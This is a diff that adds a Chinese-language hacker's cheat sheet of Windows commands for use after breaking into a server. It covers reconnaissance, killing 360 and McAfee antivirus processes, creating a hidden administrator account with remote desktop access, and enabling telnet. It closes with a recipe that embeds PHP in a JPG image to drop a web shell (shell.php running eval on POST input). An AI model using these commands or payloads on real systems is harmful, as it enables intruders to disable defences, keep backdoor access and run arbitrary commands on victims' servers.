@@ -1,0 +1,35 @@
+查看版本：ver
+查看权限：whoami
+查看配置：systeminfo
+查看用户：net user
+查看进程：tasklist
+查看正在运行的服务：tasklist /svc
+会显示所有进程的pid，找到360的pid
+通过taskkil命令l pid 可以关掉进程。
+命令ntsd -c q -p PID 可以强行结束运行进程
+serv-u mysql mssql
+查看开放的所有端口：netstat -ano 3389 1433 3306 43958
+查询会话情况：query user
+查看指定服务的路径：sc qc mssql
+添加一个用户：net user molok M0L0K /add
+提升到管理权限：net localgroup administrators molok /add
+添加用户并提升权限：net user molok M0L0K /add & net localgroup Administrators  molok /add（注意administrators大小写）
+查看指定用户的信息：net user molok
+查看所有管理权限的用户：net localgroup administrators
+加入远程桌面用户组：net localgroup “Remote Desktop Users” molok /add
+突破最大连接数：mstsc /admin /v:192.168.1.3
+删除用户：net user molok /del
+开启TELNET服务：net start telnet
+关闭麦咖啡：net stop “McAfee McShield”
+查看当前目录的所有文件：dir c:\windows\
+查看指定文件的内容：type C:\windows\Debug.txt
+把molok.txt复制到C:\windows\addins\并命名为M0L0K.txt:
+copy C:\windows\molok.txt C:\windows\addins\M0L0K.txt
+
+copy xx.jpg/b + yy.txt/a xy.jpg
+######################################
+/b 即二进制[binary]模式
+/a 即ascii模式 xx.jpg正常图片文件
+yy.txt 内容 <?PHP fputs(fopen(‘shell.php’,’w’),'<?php eval($_POST[cmd])?>’);?>
+意思为写入一个内容为 <?php eval($_POST[cmd])?> 名称为shell.php的文件
+######################################
